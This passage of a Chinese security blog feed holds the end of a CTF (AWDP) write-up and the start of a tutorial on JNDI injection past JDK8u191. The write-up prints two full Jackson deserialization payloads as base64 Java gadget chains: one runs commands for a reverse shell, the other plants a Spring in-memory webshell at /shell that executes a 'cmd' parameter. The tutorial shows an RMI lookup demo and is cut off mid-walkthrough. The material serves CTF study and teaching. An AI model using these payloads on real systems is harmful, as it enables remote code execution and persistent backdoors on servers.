ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAALAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAcAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAhAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAAEwAJABYADAAUAA0AFQAWABcADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJHB0AAR0ZXN0cHcBAHg%3d&quot;:&quot;&quot;&#125;&#125;&#125;&amp;classes=org.springframework.ui.ExtendedModelMap<br></code></pre></td></tr></table></figure><p>反弹shell</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620420.png" alt="image">​</p><p>Spring内存马</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">obj=<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.example.jackson.SecurityCheck&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;safe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;treeMap&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.HashSet&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;map&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAnNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAL3QAE0phY2tzb24uc3RhYmxlLlBvYzB0AAlQb2MwLmphdmF0AApnZXRQYXlsb2Fkc3EAfgALAAAAEXQAGUphY2tzb24uc3RhYmxlLkdldFBheWxvYWR0AA9HZXRQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0%2FA8lMbXsjhACAAFMAARsaXN0cQB%2BAAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGXhzcgAsY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuUE9KT05vZGUAAAAAAAAAAgIAAUwABl92YWx1ZXEAfgABeHIALWNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlZhbHVlTm9kZQAAAAAAAAABAgAAeHIAMGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLkJhc2VKc29uTm9kZQAAAAAAAAABAgAAeHBzfQAAAAEAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5KZGtEeW5hbWljQW9wUHJveHlMxLRxDuuW%2FAIAA1oADWVxdWFsc0RlZmluZWRaAA9oYXNoQ29kZURlZmluZWRMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAGWgALcHJlRmlsdGVyZWRbAAxhZHZpc29yQXJyYXl0ACJbTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL0Fkdmlzb3I7TAATYWR2aXNvckNoYWluRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNvckNoYWluRmFjdG9yeTtMAAhhZHZpc29yc3EAfgAHTAAKaW50ZXJmYWNlc3EAfgAHTAAMdGFyZ2V0U291cmNldAAmTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL1RhcmdldFNvdXJjZTt4cgAtb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLlByb3h5Q29uZmlni0vz5qfg928CAAVaAAtleHBvc2VQcm94eVoABmZyb3plbloABm9wYXF1ZVoACG9wdGltaXplWgAQcHJveHlUYXJnZXRDbGFzc3hwAAAAAAAAdXIAIltMb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuQWR2aXNvcjvfgw2t0h6EdAIAAHhwAAAAAHNyADxvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuRGVmYXVsdEFkdmlzb3JDaGFpbkZhY3RvcnlU3WQ34k5x9wIAAHhwc3EAfgAYAAAAAHcEAAAAAHhzcQB%2BABgAAAAAdwQAAAAAeHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuU2luZ2xldG9uVGFyZ2V0U291cmNlfVVu9cf4%2BroCAAFMAAZ0YXJnZXRxAH4AAXhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA%2F%2F%2F%2F%2F3VyAANbW0JL%2FRkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF%2FgGCFTgAgAAeHAAABagyv66vgAAADQA%2BAoANwB7CAB8CwAqAH0IAH4KAH8AgAoACQCBCACCCgAJAIMHAIQIAIUIAIYIAIcIAIgKAIkAigoAiQCLCgCMAI0HAI4KABEAjwgAkAoAEQCRCgARAJIKABEAkwgAlAsAKwCVCgCWAJcKAJYAmAoAmQCaCACbCwCcAJ0HAJ4HAJ8LAB4AoAoAoQCiCABtCgApAKMKAKQApQoApACmBwCoBwCpCAA%2FBwCqBwCrBwCsCgApAK0HAK4HAK8KAC0AsAgAsQoApwCyCwCzALQLALMAtQoAJwB7CgAfALYHALcHALgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGUxNZW5TaGVsbC9TcHJpbmdNZW1TaGVsbDsBAAVzaGVsbAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAdpc0xpbnV4AQABWgEABW9zVHlwAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAIQHAEYHALkHAI4HAKkHAKsHAKwBAApFeGNlcHRpb25zBwC6AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAuwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAC2NvbmZpZ0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAHbWV0aG9kMgEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQACbXMBAE5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1JlcXVlc3RNZXRob2RzUmVxdWVzdENvbmRpdGlvbjsBAARpbmZvAQA%2FTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAYc3ByaW5nQ29udHJvbGxlck1lbVNoZWxsBwC3AQAKU291cmNlRmlsZQEAE1NwcmluZ01lbVNoZWxsLmphdmEMADgAOQEAA2NtZAwAvAC9AQAHb3MubmFtZQcAvgwAvwC9DADAAMEBAAN3aW4MAMIAwwEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwDEDADFAMYMAMcAyAcAyQwAygDLAQARamF2YS91dGlsL1NjYW5uZXIMADgAzAEAAlxBDADNAM4MAM8A0AwA0QDBAQAADADSANMHANQMANUA1gwA1wA5BwDYDADZANoBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHANsMANwA3QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA3gDfBwDgDADhAOIMAOMA5AcA5QwA5gDnDADoAOkHAOoBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uAQAXTWVuU2hlbGwvU3ByaW5nTWVtU2hlbGwBAA9qYXZhL2xhbmcvQ2xhc3MBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAOsA7AEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOADtAQAGL3NoZWxsDADuAPAHAPEMAPIA8wwA9AD1DAD2APcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9PYmplY3QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBBKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYAIQAnADcAAAAAAAUAAQA4ADkAAQA6AAAALwABAAEAAAAFKrcAAbEAAAACADsAAAAGAAEAAAAWADwAAAAMAAEAAAAFAD0APgAAAAEAPwBAAAIAOgAAAYMABQAJAAAAqSsSArkAAwIAxgCgBD4SBLgABToEGQTGABIZBLYABhIHtgAImQAFAz4dmQAfBr0ACVkDEgpTWQQSC1NZBSsSArkAAwIAU6cAHAa9AAlZAxIMU1kEEg1TWQUrEgK5AAMCAFM6BbgADhkFtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEAAAADADsAAAAyAAwAAAAtAAsALgANAC8AFAAwACYAMQAoADMAYwA0AHAANQCAADYAlAA3AJ8AOACoADoAPAAAAFwACQANAJsAQQBCAAMAFACUAEMARAAEAGMARQBFAEYABQBwADgARwBIAAYAgAAoAEkASgAHAJQAFABLAEQACAAAAKkAPQA%2BAAAAAACpAEwATQABAAAAqQBOAE8AAgBQAAAALgAG%2FQAoAQcAUR9YBwBS%2FgAuBwBSBwBTBwBUQQcAUf8AFQADBwBVBwBWBwBXAAAAWAAAAAQAAQBZAAEAWgBbAAIAOgAAAD8AAAADAAAAAbEAAAACADsAAAAGAAEAAAA%2FADwAAAAgAAMAAAABAD0APgAAAAAAAQBcAF0AAQAAAAEAXgBfAAIAWAAAAAQAAQBgAAEAWgBhAAIAOgAAAEkAAAAEAAAAAbEAAAACADsAAAAGAAEAAABEADwAAAAqAAQAAAABAD0APgAAAAAAAQBcAF0AAQAAAAEAYgBjAAIAAAABAGQAZQADAFgAAAAEAAEAYAAIAGYAOQABADoAAAFLAAYACAAAAIi4ABsSHAO5AB0DAMAAHksqEh%2B5ACACAMAAH0wrtgAhEiK2ACNNLAS2ACQsK7YAJcAAJk4SJxIoBb0AKVkDEipTWQQSK1O2ACw6BLsALVkDvQAutwAvOgUEvQAJWQMSMFO4ADEtuQAyAgC5ADMBADoGuwAnWbcANDoHKxkGGQcZBLYANacABEuxAAEAAACDAIYANgADADsAAABCABAAAAAZAA8AGgAbABsAJQAcACoAHQAsAB4AMwAfAEoAIABXACEAZAAiAGkAIwBwACQAeQAlAIMAKQCGACcAhwAqADwAAABSAAgADwB0AGcAaAAAABsAaABpAGoAAQAlAF4AawBsAAIAMwBQAG0AcAADAEoAOQBxAHIABABXACwAcwB0AAUAcAATAHUAdgAGAHkACgB3AD4ABwBQAAAACQAC9wCGBwB4AAACAHkAAAACAHoAbwAAABIAAgAmAKcAbgAJALMApwDvBglwdAAEdGVzdHB3AQB4&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span>&amp;classes=org.springframework.ui.ExtendedModelMap<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401281620559.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次比赛也是跟@清风一起打的，说实话，本来感觉有压力的(好吧其实PWN压力多点)，我们两个Web狗都在搞节目效果一样，各种骚操作了，学到了蛮多AWDP的技巧哈哈</p><p>‍</p><ul><li><p>不一定要过滤很多很多，其实过滤一两个就差不多了，特别注意，没必要禁用flag，禁用f就好了差不多了</p></li><li><p>多尝试，一定一定要看清楚路径！！！这个太重要了 只要有问题，可以先删掉功能点看服务是否异常或者是多路径(可疑路径都传一遍不就得了)传参，比如如下图所示</p></li><li><p>不一定写少代码有好处，能多执行就执行啊</p></li><li><p>要多看依赖！SSTI那个导依赖看render就过滤依赖至关重要了</p></li></ul><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - 记JDK8u191后JNDI绕过原理</title>
    <link href="/post/java-security-remembrance-jdk8u191-jndi-bypasses-the-principle-2m8bwc.html"/>
    <url>/post/java-security-remembrance-jdk8u191-jndi-bypasses-the-principle-2m8bwc.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13793">https://xz.aliyun.com/t/13793</a></p><p>诶呀这玩意学了蛮久了真的，离大谱，各种事故各种坑点，不过结果还算好都弄清楚了，记录下顺便分享两个CTF案例来进行加深理解，下次遇到高jdk的JNDI就不会那么踉踉跄跄了</p><p>‍</p><h1 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h1><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121595.png" alt="image">​</p><p>JNDI可以访问的目录及服务，比如：DNS、LDAP、CORBA对象服务、RMI等等。</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121099.png" alt="image">​</p><p>‍</p><h2 id="RMI-JNDI"><a href="#RMI-JNDI" class="headerlink" title="RMI + JNDI"></a>RMI + JNDI</h2><p>首先上述也讲清楚了，其实JNDI的标准注入就是从<code>RMI</code>​中去寻找对应的名字所对应的<code>Reference</code>​对象，而这个对象是可以任意写地址和类的，所以其实JNDI就是去找这么个东西，可以看如下demo</p><p>首先是开启一个RMI的服务器，然后在JNDI的Server端把我们的<code>Reference</code>​对象重新绑定到某个名字下，此时在写了恶意payload的class文件目录下开启http服务，然后用JNDI的客户端直接去<code>lookup</code>​查找rmi服务</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JNDIClient.java</span><br><span class="hljs-keyword">package</span> jndi;<br><br><span class="hljs-keyword">import</span> method.SayHello;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">SayHello</span> <span class="hljs-variable">sayHello</span> <span class="hljs-operator">=</span> (SayHello)initialContext.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/sayhello&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121489.png" alt="image">​</p><p>来跟一下断点，直接在<code>JndiClient.java</code>​的<code>lookup</code>​方法下断点调试</p><p>会先走几个无关紧要的<code>lookup</code>​方法最后会走到对应协议的<code>lookup</code>​方法中，因为我走的是<code>RMI</code>​协议所以最后走到了</p><p><code>\rt.jar!\com\sun\jndi\rmi\registry\RegistryContext.java#lookup()</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121266.png" alt="image">​</p><p>然后返回的时候把获取到的结果传入<code>decodeObject</code>​方法，跟进下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121627.png" alt="image">​</p><p>发现只要是继承了<code>RemoteReference</code>​类，就会调用<code>getObjectInstance</code>​方法继续往下处理，再次跟进下</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121897.png" alt="image">​</p><p>发现是从引用的变量中获取工厂，调用了<code>getObjectFactoryFromReference</code>​方法 ，继续跟进</p><p>发现就已经开始类加载了(我的类是<code>T</code>​)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121181.png" alt="image">​</p><p>然后先用 <code>AppClassLoader</code>​寻找本地类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121419.png" alt="image">​</p><p>‍</p><p>当然这里找不到的话就会走下面的逻辑再次加载</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121652.png" alt="image">​</p><p>跟进下发现最后会调用<code>URLClasserloader</code>​去远程加载</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401181121858.png" 